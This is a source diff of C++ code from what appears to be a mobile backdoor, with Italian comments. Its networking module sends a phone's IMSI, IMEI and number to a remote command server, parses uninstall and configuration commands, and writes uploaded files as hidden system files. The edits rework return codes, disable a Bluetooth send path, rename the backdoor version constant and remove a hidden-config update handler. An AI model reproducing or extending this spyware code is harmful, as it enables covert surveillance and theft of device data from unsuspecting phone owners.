@@ -341,7 +341,7 @@ BOOL Transfer::IsWidcomm() {
 }
 
 BOOL Transfer::BtSend() {
-	WSADATA wsd;
+	/*WSADATA wsd;
 	list<ConfStruct>::const_iterator iter;
 	SOCKADDR_BTH sab;
 	BTH_SOCKOPT_SECURITY bss;
@@ -529,7 +529,7 @@ BOOL Transfer::BtSend() {
 
 	if (bNewConf)
 		return SEND_RELOAD;
-
+*/
 	return FALSE;
 }
 
@@ -836,10 +836,10 @@ UINT Transfer::WiFiSendPda() {
 	return FALSE;
 }
 
-UINT Transfer::InternetSend(const wstring &strHostname) {
+INT Transfer::InternetSend(const wstring &strHostname) {
 	if (strHostname.empty()) {
 		DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() FAILED [0]\n", 4, FALSE);
-		return FALSE;
+		return SEND_FAIL;
 	}
 
 	bUninstall = bNewConf = FALSE;
@@ -876,7 +876,7 @@ UINT Transfer::InternetSend(const wstring &strHostname) {
 			RestSendCommand((PBYTE)&uCommand, sizeof(uCommand), uResponse);
 
 			DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestIdentification() FAILED]: ", 4, TRUE);
-			return FALSE;
+			return SEND_FAIL;
 		}
 
 		// Parsiamo le richieste ricevute dal server
@@ -914,10 +914,10 @@ UINT Transfer::InternetSend(const wstring &strHostname) {
 		if (bNewConf)
 			return SEND_RELOAD;
 
-		return TRUE;
+		return SEND_OK;
 	}
 
-	return FALSE;
+	return SEND_FAIL;
 }
 
 BYTE* Transfer::RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uResponseLen) {
@@ -1370,14 +1370,14 @@ BOOL Transfer::RestIdentification() {
 	wstring strImei = deviceObj->GetImei();
 	wstring strNumber = deviceObj->GetPhoneNumber();
 
-	UINT uContentLen = Encryption::GetPKCS5Len(sizeof(PROTO_ID) + sizeof(BACKDOOR_VERSION) + 
+	UINT uContentLen = Encryption::GetPKCS5Len(sizeof(PROTO_ID) + sizeof(g_Version) + 
 						sizeof(UINT) + strImsi.size() * sizeof(WCHAR) + sizeof(WCHAR) +
 						sizeof(UINT) + strImei.size() * sizeof(WCHAR) + sizeof(WCHAR) +
 						sizeof(UINT) + strNumber.size() * sizeof(WCHAR) + sizeof(WCHAR) +
 						20);
 
 	// Utilizzata per lo SHA1
-	UINT uRawContentLen = sizeof(PROTO_ID) + sizeof(BACKDOOR_VERSION) + 
+	UINT uRawContentLen = sizeof(PROTO_ID) + sizeof(g_Version) + 
 		sizeof(UINT) + strImsi.size() * sizeof(WCHAR) + sizeof(WCHAR) +
 		sizeof(UINT) + strImei.size() * sizeof(WCHAR) + sizeof(WCHAR) +
 		sizeof(UINT) + strNumber.size() * sizeof(WCHAR) + sizeof(WCHAR);
@@ -1396,8 +1396,8 @@ BOOL Transfer::RestIdentification() {
 	b.append((PUCHAR)&uCommand, sizeof(PROTO_ID));
 
 	// Inseriamo la Backdoor Version
-	uCommand = BACKDOOR_VERSION;
-	b.append((PUCHAR)&uCommand, sizeof(BACKDOOR_VERSION));
+	uCommand = g_Version;
+	b.append((PUCHAR)&uCommand, sizeof(g_Version));
 
 	// Inseriamo l'UserID
 	UINT uPascalLen;
@@ -2155,31 +2155,6 @@ BOOL Transfer::RestGetUploads() {
 
 			RegCloseKey(hKey);
 			RegFlushKey(HKEY_LOCAL_MACHINE);
-		} else if (wcsncmp(L"conf-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) { // Upgrade Conf da 7.5 a 8.0
-			// Creiamolo
-			wstring strUploaded;
-			strUploaded = GetCurrentPath(L"cptm811.dql"); // Nome della conf per la 8.0
-
-			if (strUploaded.empty())
-				continue;
-
-			hFile = CreateFile(strUploaded.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);
-
-			if (hFile == INVALID_HANDLE_VALUE)
-				continue;
-
-			b.setPos(b.getPos() + uPascalLen);
-			uFileLen = b.getInt();
-
-			DWORD dwWritten = 0;
-
-			// Scriviamolo
-			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
-				CloseHandle(hFile);
-				continue;
-			}
-
-			CloseHandle(hFile);
 		} else {
 			// Creiamolo
 			wstring strUploaded;
